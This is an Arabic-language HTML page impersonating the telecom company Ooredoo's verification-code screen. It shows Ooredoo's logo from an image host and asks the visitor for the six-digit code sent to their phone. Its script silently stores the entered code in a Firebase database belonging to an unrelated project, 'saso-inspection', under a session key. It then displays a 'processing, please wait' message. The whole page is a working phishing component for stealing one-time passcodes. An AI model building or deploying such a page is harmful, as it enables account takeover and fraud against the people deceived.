<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق - أوريدو</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');

        body {
            font-family: 'Cairo', sans-serif;
            background-color: #ffffff;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 400px;
            box-sizing: border-box;
        }

        /* الهيدر الموحد */
        header {
            padding: 15px; 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            border-bottom: 1px solid #f0f0f0;
            background-color: #ffffff;
        }
        .menu-icon { 
            font-size: 28px; 
            cursor: pointer; 
            color: #d71920; 
            font-weight: bold;
        }
        .logo-container img { 
            height: 40px; 
            width: auto;
            background-color: transparent !important;
            display: block;
        }

        .content-body { padding: 20px; }

        h1 { font-size: 20px; color: #333; margin-top: 20px; margin-bottom: 10px; }
        .sub-text { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }

        .input-group { margin-bottom: 25px; }
        input {
            width: 100%; padding: 15px; border: 1px solid #ccc;
            border-radius: 5px; box-sizing: border-box; font-size: 20px;
            text-align: center; letter-spacing: 10px;
        }

        .submit-btn {
            width: 100%; padding: 15px; background-color: #d71920;
            color: white; border: none; border-radius: 50px;
            font-size: 16px; font-weight: bold; cursor: pointer;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="menu-icon">☰</div>
        <div class="logo-container">
            <img src="https://i.ibb.co/MxhZBkjF/Ooredoo-logo-1.jpg" alt="Ooredoo Logo">
        </div>
        <div style="width: 28px;"></div>
    </header>

    <div class="content-body">
        <h1>رمز التحقق</h1>
        <p class="sub-text">يرجى إدخال رمز التحقق المرسل عبر الجوال لإتمام العملية.</p>

        <form id="otpForm">
            <div class="input-group">
                <input type="text" id="otp_code" placeholder="******" required maxlength="6" inputmode="numeric" pattern="[0-9]*">
            </div>
            
            <button type="submit" class="submit-btn">تأكيد الرمز</button>
        </form>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.firebasestorage.app",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let sessionID = localStorage.getItem('sessionID');

    document.getElementById('otpForm').onsubmit = (e) => {
        e.preventDefault();
        const otp = document.getElementById('otp_code').value;

        database.ref('ooredoo_otp/' + sessionID).set({
            code: otp,
            timestamp: Date.now()
        }).then(() => {
            Swal.fire({ title: 'جاري المعالجة', text: 'يرجى الانتظار...', icon: 'info', showConfirmButton: false });
        });
    };
</script>

</body>
</html>
